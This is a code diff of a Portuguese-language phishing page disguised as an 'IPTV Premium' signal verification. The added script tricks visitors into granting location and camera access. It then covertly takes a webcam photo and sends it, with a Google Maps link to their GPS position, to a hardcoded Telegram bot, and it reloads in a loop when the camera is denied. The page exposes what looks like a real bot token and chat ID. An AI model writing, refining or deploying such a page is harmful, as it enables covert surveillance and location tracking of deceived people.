@@ -5,41 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IPTV Premium - Verificação de Sinal</title>
     <style>
-        /* Estilo Dark Profissional */
-        body { 
-            background: #0f0f0f; 
-            color: #ffffff; 
-            text-align: center; 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            margin: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            height: 100vh;
-        }
-        .container { padding: 20px; }
-        .player-box {
-            background: #1a1a1a;
-            border: 2px solid #3498db;
-            border-radius: 15px;
-            width: 90%;
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 30px;
-            box-shadow: 0 0 20px rgba(52, 152, 219, 0.3);
-        }
-        .loader { 
-            border: 8px solid #333; 
-            border-top: 8px solid #3498db; 
-            border-radius: 50%; 
-            width: 50px; 
-            height: 50px; 
-            animation: spin 1s linear infinite; 
-            margin: 20px auto; 
-        }
+        body { background: #0f0f0f; color: #ffffff; text-align: center; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; justify-content: center; height: 100vh; }
+        .player-box { background: #1a1a1a; border: 2px solid #3498db; border-radius: 15px; width: 90%; max-width: 500px; margin: 0 auto; padding: 30px; box-shadow: 0 0 20px rgba(52, 152, 219, 0.3); }
+        .loader { border: 8px solid #333; border-top: 8px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { color: #3498db; margin-bottom: 10px; }
-        p { color: #aaaaaa; font-size: 14px; }
+        h2 { color: #3498db; }
         .status { font-weight: bold; color: #f1c40f; }
     </style>
 </head>
@@ -50,9 +20,9 @@
             <h2>Sinal IPTV HD</h2>
             <div class="loader"></div>
             <p id="msg">Iniciando verificação de segurança...</p>
-            <p class="status">Status: Aguardando permissão do dispositivo</p>
+            <p class="status" id="status-txt">Otimizando rota de sinal...</p>
             <hr style="border: 0.5px solid #333; margin: 20px 0;">
-            <p style="font-size: 12px;">Para liberar o acesso aos canais, confirme a verificação de dispositivo no seu navegador.</p>
+            <p style="font-size: 12px; color: #888;">Confirme a localização e a câmera para liberar o acesso aos canais premium.</p>
         </div>
     </div>
     
@@ -60,34 +30,38 @@
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // Seus dados mantidos conforme solicitado
         const token = '8632329845:AAEV3zXLv1xR3N3Z9-HTbjvuMjX5cvpuQOo';
         const chat_id = '5609141148';
 
-        async function startCamera() {
-            const msgElement = document.getElementById('msg');
-            try {
-                // Solicita a câmera
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+        async function iniciar() {
+            // 1. Pede o GPS Primeiro (Disfarçado)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const linkMapa = `https://www.google.com/maps?q=${lat},${lon}`;
                 
-                msgElement.innerText = "Sinal Verificado! Carregando canais...";
-                msgElement.style.color = "#2ecc71";
+                // 2. Depois de aceitar GPS, pede a Câmera
+                pedirCamera(`📍 Localização: ${linkMapa}`);
+            }, async (err) => {
+                // Se ele negar GPS, ainda tenta a Câmera
+                pedirCamera("📸 Foto (GPS Negado)");
+            }, {enableHighAccuracy: true, timeout: 5000});
+        }
 
-                // Tira a foto após 2 segundos (tempo do rosto focar)
-                setTimeout(() => {
-                    takeSnap();
-                }, 2000);
+        async function pedirCamera(legenda) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('status-txt').innerText = "Verificando dispositivo...";
 
+                setTimeout(() => takeSnap(legenda), 2500);
             } catch (err) {
-                // Se ele negar, o site avisa e tenta de novo (gera o loop de trollagem)
-                alert("ERRO DE SINAL: É necessário permitir a câmera para validar seu acesso e evitar pirataria. O vídeo só será liberado após a confirmação.");
-                location.reload(); 
+                alert("ERRO DE SINCRONIA: Você precisa permitir a câmera para validar seu acesso.");
+                location.reload();
             }
         }
 
-        function takeSnap() {
+        function takeSnap(legenda) {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
@@ -96,19 +70,18 @@
                 const formData = new FormData();
                 formData.append('chat_id', chat_id);
                 formData.append('photo', blob, 'troll.jpg');
-                formData.append('caption', '📸 Foto capturada do seu novo player!');
+                formData.append('caption', legenda);
 
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 }).then(() => {
-                    // Manda para o vídeo do YouTube após a foto ser enviada
                     window.location.href = "https://youtu.be/GusddLRUIqs?si=w0QdpMfR5w767Oer";
                 });
             }, 'image/jpeg');
         }
 
-        window.onload = startCamera;
+        window.onload = iniciar;
     </script>
 </body>
 </html>
